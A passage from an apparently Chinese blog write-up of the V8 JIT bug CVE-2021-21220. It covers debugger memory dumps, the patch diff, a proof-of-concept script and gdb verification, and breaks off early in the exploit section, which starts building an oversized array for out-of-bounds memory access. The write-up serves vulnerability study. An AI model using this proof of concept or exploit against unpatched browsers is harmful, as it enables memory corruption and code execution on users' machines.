&lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3c6c0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x3c6c080446c1: [String] in ReadOnlySpace: #length: 0x3c6c0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: -1</span><br><span class="line">           1: 0</span><br><span class="line">           2: 1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; telescope 0x3c6c082123e0</span><br><span class="line">00:0000│  0x3c6c082123e0 ◂— 0x608042531</span><br><span class="line">01:0008│  0x3c6c082123e8 ◂— 0xfffffffe</span><br><span class="line">02:0010│  0x3c6c082123f0 ◂— 0x80431b900000002</span><br><span class="line">03:0018│  0x3c6c082123f8 ◂— 0x82123e100000000</span><br><span class="line">04:0020│  0x3c6c08212400 ◂— 0x8042509</span><br><span class="line">05:0028│  0x3c6c08212408 ◂— 0x608042205</span><br><span class="line">06:0030│  0x3c6c08212410 ◂— 0x82123f5082123d5</span><br><span class="line">07:0038│  0x3c6c08212418 ◂— 0x8042a1d08212345</span><br></pre></td></tr></table></figure><p>可以看出-1在smi中表示为0xfffffffe，而0xfffffffe在十六进制有符号表示为-2，这块需要注意。</p><h4 id="（3）常见数据结构"><a href="#（3）常见数据结构" class="headerlink" title="（3）常见数据结构"></a>（3）常见数据结构</h4><h5 id="浮点型数组"><a href="#浮点型数组" class="headerlink" title="浮点型数组"></a>浮点型数组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x56008144335</span><br><span class="line">0x56008144335: [JSArray]</span><br><span class="line"> - map: 0x0560082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x05600820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x05600804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x560080446c1: [String] in ReadOnlySpace: #length: 0x05600818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 1.2</span><br><span class="line">           2: 1.3</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20wx 0x56008144335-1</span><br><span class="line">0x56008144334:  0x082439f1      0x0804222d      0x08144315      0x00000006</span><br><span class="line">0x56008144344:  0x080455b9      0x08212999      0x08042205      0x00000004</span><br><span class="line">0x56008144354:  0x081442fd      0x08144335      0x08243a41      0x0804222d</span><br><span class="line">0x56008144364:  0x0814434d      0x00000004      0x080455b9      0x082129c5</span><br><span class="line">0x56008144374:  0x08042a95      0x00000002      0x00000000      0x41e00000</span><br><span class="line">pwndbg&gt; telescope 0x056008144314</span><br><span class="line">00:0000│  0x56008144314 ◂— 0x608042a95</span><br><span class="line">01:0008│  0x5600814431c ◂— 0x3ff199999999999a</span><br><span class="line">02:0010│  0x56008144324 ◂— 0x3ff3333333333333</span><br><span class="line">03:0018│  0x5600814432c ◂— 0x3ff4cccccccccccd</span><br><span class="line">04:0020│  0x56008144334 ◂— 0x804222d082439f1</span><br><span class="line">05:0028│  0x5600814433c ◂— 0x608144315</span><br><span class="line">06:0030│  0x56008144344 ◂— 0x8212999080455b9</span><br><span class="line">07:0038│  0x5600814434c ◂— 0x408042205</span><br></pre></td></tr></table></figure><p>根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。</p><h5 id="“smi数组”"><a href="#“smi数组”" class="headerlink" title="“smi数组”"></a>“smi数组”</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x367b082a9c29: [JSArray]</span><br><span class="line"> - map: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x367b0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x367b0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x367b080446c1: [String] in ReadOnlySpace: #length: 0x367b0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 0x367b0804242d &lt;the_hole&gt;</span><br><span class="line">           1: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x367b0804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x367b082a9c1d &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x367b08042a95 &lt;Map&gt;</span><br><span class="line">           6: 3</span><br><span class="line">           7: -858993459</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/12wx 0x367b082a9c1d-1</span><br><span class="line">0x367b082a9c1c: 0x08042205      0x0804242d      0x0804242d      0x082439c9</span><br><span class="line">0x367b082a9c2c: 0x0804222d      0x082a9c1d      0xfffffffe      0x08042a95</span><br><span class="line">0x367b082a9c3c: 0x00000006      0x9999999a      0x3ff19999      0x33333333</span><br><span class="line">pwndbg&gt; x/8wx 0x367b082a9c29-1</span><br><span class="line">0x367b082a9c28: 0x082439c9      0x0804222d      0x082a9c1d      0xfffffffe</span><br><span class="line">0x367b082a9c38: 0x08042a95      0x00000006      0x9999999a      0x3ff19999</span><br></pre></td></tr></table></figure><p>这是个伪smi数组，是由于本漏洞构造的超长数组的现场。</p><p>根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。（和上面的浮点型数组内存构造是相同的）</p><p>在本漏洞利用中，可以通过相对地址写覆盖浮点型数组的长度伪超长，使浮点型数组也具有相对地址读写的能力。</p><h4 id="4-指针压缩"><a href="#4-指针压缩" class="headerlink" title="(4)指针压缩"></a>(4)指针压缩</h4><p>参考[89]。64位v8程序中，堆指针高32位地址值是相同的，可以看下面某次v8的调试信息，高32位的的地址值为0xdf2，这个信息存储在寄存器R13位置处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     0xdf200000000      0xdf20000d000 rw-p     d000 0</span><br><span class="line">     0xdf20000d000      0xdf200040000 ---p    33000 0</span><br><span class="line">     0xdf200040000      0xdf200170000 r-xp   130000 0</span><br><span class="line">     0xdf200170000      0xdf200180000 ---p    10000 0</span><br><span class="line">     0xdf200180000      0xdf200183000 rw-p     3000 0</span><br><span class="line">     0xdf200183000      0xdf200184000 ---p     1000 0</span><br><span class="line">     0xdf200184000      0xdf200194000 r-xp    10000 0</span><br><span class="line">     0xdf200194000      0xdf2001bf000 ---p    2b000 0</span><br><span class="line">     0xdf2001bf000      0xdf2001c0000 ---p     1000 0</span><br><span class="line">     0xdf2001c0000      0xdf2001c3000 rw-p     3000 0</span><br><span class="line">     0xdf2001c3000      0xdf2001c4000 ---p     1000 0</span><br><span class="line">     0xdf2001c4000      0xdf2001ff000 r-xp    3b000 0</span><br><span class="line">     0xdf2001ff000      0xdf208040000 ---p  7e41000 0</span><br><span class="line">     0xdf208040000      0xdf208061000 r--p    21000 0</span><br><span class="line">     0xdf208061000      0xdf208080000 ---p    1f000 0</span><br><span class="line">     0xdf208080000      0xdf20818d000 rw-p   10d000 0</span><br><span class="line">     0xdf20818d000      0xdf2081c0000 ---p    33000 0</span><br><span class="line">     0xdf2081c0000      0xdf2081c3000 rw-p     3000 0</span><br><span class="line">     0xdf2081c3000      0xdf208200000 ---p    3d000 0</span><br><span class="line">     0xdf208200000      0xdf2083c0000 rw-p   1c0000 0</span><br><span class="line">     0xdf2083c0000      0xdf300000000 ---p f7c40000 0</span><br><span class="line">    0x55fe3a44c000     0x55fe3ac71000 r--p   825000 0      /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3ac71000     0x55fe3ba48000 r-xp   dd7000 824000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3ba48000     0x55fe3bab5000 r--p    6d000 15fa000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">    0x55fe3bab5000     0x55fe3bac4000 rw-p     f000 1666000 /root/v8/v8/out/x64.release/d8</span><br><span class="line">...</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> RCX  0xdf20013f500 ◂— push   rbp</span><br><span class="line"> RDX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fffaaa8fd00 —▸ 0xdf208042895 ◂— 0x80428</span><br><span class="line"> R8   0xdf20821289d ◂— 0x7500000006082442</span><br><span class="line"> R9   0x145</span><br><span class="line"> R10  0xc00000000</span><br><span class="line"> R11  0xfffffffffffffffa</span><br><span class="line"> R12  0x55fe3c799170 ◂— 0x0</span><br><span class="line"> R13  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> R14  0x55fe3ba73160 (v8::internal::kIntrinsicFunctions) ◂— 0x0</span><br><span class="line"> R15  0x55fe3c7975e0 ◂— 0x1baddead0baddeaf</span><br><span class="line"> RBP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ...</span><br><span class="line"> RSP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ...</span><br><span class="line"> RIP  0x55fe3b8ca445 (v8::base::OS::DebugBreak()+5) ◂— pop    rbp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现代CPU中的分支预测器非常好，并且代码大小（尤其是执行路径长度）对性能的影响更大。</p><p>具体的实现可以参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 / src / common / ptr-compr.h</span><br><span class="line">v8 / src / common / ptr-compr-inl.h</span><br></pre></td></tr></table></figure><h3 id="3、补丁对比"><a href="#3、补丁对比" class="headerlink" title="3、补丁对比"></a>3、补丁对比</h3><p>根据issue里面的补丁比较链接</p><p><a class="link"   href="https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc#1381" >https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc#1381<i class="fas fa-external-link-alt"></i></a></p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422093925521.png" alt="image-20210422093925521"></p><p>可以看出该bugfix的函数为ChangeInt32ToInt64，将32位整形数向64位进行拓展，修复之前的代码为判断传入的32位整型数是否为有符号从而选择movsx和mov，而修复后强制使用movsx进行有符号拓展。</p><h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><h4 id="（1）POC分析"><a href="#（1）POC分析" class="headerlink" title="（1）POC分析"></a>（1）POC分析</h4><p>POC与执行结果如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print = <span class="built_in">console</span>.log;</span><br><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);<span class="comment">// 定义了一个只有一个元素的Uint32类型的数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;    <span class="comment">// 漏洞触发</span></span><br><span class="line">&#125; </span><br><span class="line">print(foo());<span class="comment">//-2147483647// 解释器工作</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)<span class="comment">//代码价值提升，交由JIT处理</span></span><br><span class="line">    foo();</span><br><span class="line">print(foo());<span class="comment">//2147483649//JIT处理后的结果</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 test_jscode/d8_poc.js</span></span><br><span class="line">-2147483647</span><br><span class="line">2147483649</span><br></pre></td></tr></table></figure><p>我们对POC进行分析，首先分析arr数组元素</p><p>arr[0]是unsigned int32 = <code>2**31</code> = 2147483648 = 0x8000 0000</p><p> arr[0] ^ 0会转成signed int32 = 2**31^0 = 0x8000 0000 = -2147483648，至于为什么无符号操作数与0异或变为有符号，参考[4]。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422212700225.png" alt="image-20210422212700225"></p><p> (arr[0] ^ 0) + 1会转成signed int64，按理说是先符号拓展，得到0xFFFF FFFF 8000 0000，然后再加一，得到0xFFFF FFFF 8000 0001 = -2147483647</p><p>之后会解释器执行打印函数返回值以及JIT编译执行打印函数返回值</p><p>可以看到，在经过JIT优化前与优化后，foo的返回值是不相同的；这个从上面的补丁分析中我们也已经了解了，JIT在处理代码的时候将本该有符号拓展的数进行了无符号拓展。</p><h4 id="（2）执行流分析"><a href="#（2）执行流分析" class="headerlink" title="（2）执行流分析"></a>（2）执行流分析</h4><h5 id="SimplifiedLowering"><a href="#SimplifiedLowering" class="headerlink" title="SimplifiedLowering"></a>SimplifiedLowering</h5><p>在该阶段，通过#45 LoadTypedElement可以知道arr[0]的类型 Unsigned32，之后#31 Word32Xor处理之后类型为Signed32，之后+1需要做int32到int64的转换，调用了#58 ChangeInt32ToInt64，并将返回值与#59 Int64Constant[1]作为参数交由#50 ChangeInt32ToInt64处理。这段处理逻辑是没有问题的。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422210705763.png" alt="image-20210422210705763"></p><h5 id="MachineOperatorOptimization"><a href="#MachineOperatorOptimization" class="headerlink" title="MachineOperatorOptimization"></a>MachineOperatorOptimization</h5><p>而在该阶段，将arr[0] ^ 0通过JIT在#81 Load处获取运算所得的结果，此时该结果的类型为kRepWord32[kTypeUint32]，为<strong>无符号</strong>，此时仍然经过#58 ChangeInt32ToInt64进行处理。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210422214123570.png" alt="image-20210422214123570"></p><p>而ChangeInt32ToInt64的处理如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">case</span> MachineRepresentation::kWord32:</span><br><span class="line">        opcode = load_rep.<span class="built_in">IsSigned</span>() ? kX64Movsxlq : kX64Movl;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>由于操作数时无符号，所以这里进行了无符号拓展，此时(arr[0] ^ 0) + 1的值为0 x 0000 0000 8000 0000 + 1，为2147483649。</p><h4 id="（3）动态验证"><a href="#（3）动态验证" class="headerlink" title="（3）动态验证"></a>（3）动态验证</h4><p>通过gdb验证下我们上述分析的过程，动态分析的思路为通过%DebugPrint输出得到arr元素的内存地址，然后下内存读断点，追踪到JIT处理foo函数的位置。</p><p>定位流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release# gdb d8</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test_jscode/d8_poc.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line">-2147483647</span><br><span class="line">DebugPrint: 0x4e60808851d: [JSTypedArray]</span><br><span class="line"> - map: 0x04e608243109 &lt;Map(UINT32ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt;</span><br><span class="line"> - elements: 0x04e608088511 &lt;ByteArray[4]&gt; [UINT32ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x04e6080884d9 &lt;ArrayBuffer map = 0x4e6082431f9&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 4</span><br><span class="line"> - length: 1</span><br><span class="line"> - data_ptr: 0x4e608088518</span><br><span class="line">   - base_pointer: 0x8088511</span><br><span class="line">   - external_pointer: 0x4e600000007</span><br><span class="line"> - properties: 0x04e60804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - elements: 0x04e608088511 &lt;ByteArray[4]&gt; &#123;</span><br><span class="line">           0: 2147483648</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">0x4e608243109: [Map]</span><br><span class="line"> - type: JS_TYPED_ARRAY_TYPE</span><br><span class="line"> - instance size: 68</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: UINT32ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x04e6080423b5 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x04e608182405 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x04e6080421c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt;</span><br><span class="line"> - constructor: 0x04e60820979d &lt;JSFunction Uint32Array (sfi = 0x4e608189721)&gt;</span><br><span class="line"> - dependent code: 0x04e608212aed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/wx 0x04e608088511-1+8</span><br><span class="line">0x4e608088518:  0x80000000</span><br><span class="line">pwndbg&gt; rwatch *(int*)0x04e608088518</span><br><span class="line">Hardware read watchpoint 1: *(int*)0x04e60808851</span><br></pre></td></tr></table></figure><p>验证静态分析结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Thread 1 &quot;d8&quot; hit Hardware read watchpoint 1: *(int*)0x04e608088518</span><br><span class="line">Value = -2147483648</span><br><span class="line">0x000004e6001c4330 in ?? ()</span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line">*RBX  0x4e608212ac9 ◂— 0x8080423b508042a</span><br><span class="line">*RCX  0x80000000</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4e6001c4330    add    rcx, 1</span><br><span class="line">   0x4e6001c4334    mov    edi, ecx</span><br><span class="line">   0x4e6001c4336    movsxd r8, ecx</span><br><span class="line">   0x4e6001c4339    cmp    r8, rcx</span><br><span class="line">   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x4e6001c4394    movabs rdi, 0x5626663c8c48</span><br><span class="line">   0x4e6001c439e    mov    r8, qword ptr [rdi]</span><br><span class="line">   0x4e6001c43a1    lea    r9, [r8 + 0xc]</span><br><span class="line">   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx</span><br><span class="line">   0x4e6001c43a9    movabs r11, 0x5626663c8c50</span><br><span class="line">   0x4e6001c43b3    cmp    qword ptr [r11], r9</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; si</span><br><span class="line">0x000004e6001c4334 in ?? ()</span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x4e608212ac9 ◂— 0x8080423b508042a</span><br><span class="line">*RCX  0x80000001</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────</span><br><span class="line">   0x4e6001c4330    add    rcx, 1</span><br><span class="line"> ► 0x4e6001c4334    mov    edi, ecx</span><br><span class="line">   0x4e6001c4336    movsxd r8, ecx</span><br><span class="line">   0x4e6001c4339    cmp    r8, rcx</span><br><span class="line">   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x4e6001c4394    movabs rdi, 0x5626663c8c48</span><br><span class="line">   0x4e6001c439e    mov    r8, qword ptr [rdi]</span><br><span class="line">   0x4e6001c43a1    lea    r9, [r8 + 0xc]</span><br><span class="line">   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx</span><br><span class="line">   0x4e6001c43a9    movabs r11, 0x5626663c8c50</span><br><span class="line">   0x4e6001c43b3    cmp    qword ptr [r11], r9</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/5i 0x4e6001c432b</span><br><span class="line">   0x4e6001c432b:       add    rcx,r8</span><br><span class="line">   0x4e6001c432e:       mov    ecx,DWORD PTR [rcx]</span><br><span class="line">   0x4e6001c4330:       add    rcx,0x1</span><br><span class="line">=&gt; 0x4e6001c4334:       mov    edi,ecx</span><br><span class="line">   0x4e6001c4336:       movsxd r8,ecx</span><br></pre></td></tr></table></figure><p>观察到在执行完<strong>0x4e6001c432e</strong>处指令后，RCX 的值为 0x80000000，并没有进行有符号拓展，而执行完<strong>0x4e6001c4330</strong>后，RCX 的值为 0x80000001，验证了我们得到的结果。</p><h4 id="（4）EXP构造"><a href="#（4）EXP构造" class="headerlink" title="（4）EXP构造"></a>（4）EXP构造</h4><h5 id="（1）构造超长数组"><a href="#（1）构造超长数组" class="headerlink" title="（1）构造超长数组"></a>（1）构造超长数组</h5><p>从ChangeInt32ToInt64到将数组长度设置为-1，需要用到一种针对于JIT常用的利用技术：typer bug[6]，简单的理解就是在JavaScript函数的前几次调用期间，解释器记录各种操作的类型信息，例如参数访问和属性加载。如果以后选择该函数进行JIT编译，则V8的最新编译器TurboFan会假定在所有后续调用中都将使用观察到的类型，并使用从解释器中得出的规则集将类型信息传播到JIT。</p><p>我们将poc构造如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">x -= <span class="number">2147483647</span>;</span><br><span class="line">x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);<span class="comment">// predicted = 0; actual = 2</span></span><br><span class="line">x -= <span class="number">1</span>;   <span class="comment">// predicted = -1; actual = 1</span></span><br><span class="line"><span 